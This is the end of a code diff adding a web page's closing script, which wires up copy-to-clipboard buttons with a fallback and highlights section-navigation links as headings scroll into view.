+      var done=function(){btn.textContent='copied';btn.classList.add('done');
+        setTimeout(function(){btn.textContent='copy';btn.classList.remove('done');},1400);};
+      if(navigator.clipboard&&navigator.clipboard.writeText){
+        navigator.clipboard.writeText(text).then(done).catch(function(){fb(text,done);});
+      } else {fb(text,done);}
+    });
+    wrap.appendChild(btn);
+  });
+  function fb(text,cb){var ta=document.createElement('textarea');ta.value=text;
+    ta.style.position='fixed';ta.style.opacity='0';document.body.appendChild(ta);ta.select();
+    try{document.execCommand('copy');cb();}catch(e){}document.body.removeChild(ta);}
+
+  var navLinks=Array.prototype.slice.call(document.querySelectorAll('.sec-nav a'));
+  if(navLinks.length){
+    var map={}; navLinks.forEach(function(a){map[a.getAttribute('href').slice(1)]=a;});
+    var heads=Array.prototype.slice.call(document.querySelectorAll('main h2[id]'));
+    var obs=new IntersectionObserver(function(entries){
+      entries.forEach(function(e){
+        if(e.isIntersecting){
+          navLinks.forEach(function(a){a.classList.remove('here');});
+          var a=map[e.target.id];
+          if(a){a.classList.add('here');var ic=a.parentElement;if(ic&&ic.scrollWidth>ic.clientWidth){ic.scrollTo({left:a.offsetLeft-ic.clientWidth/2+a.offsetWidth/2,behavior:'smooth'});}}
+        }
+      });
+    },{rootMargin:'-130px 0px -70% 0px',threshold:0});
+    heads.forEach(function(h){obs.observe(h);});
+  }
+})();
+</script>
+</body>
+</html>
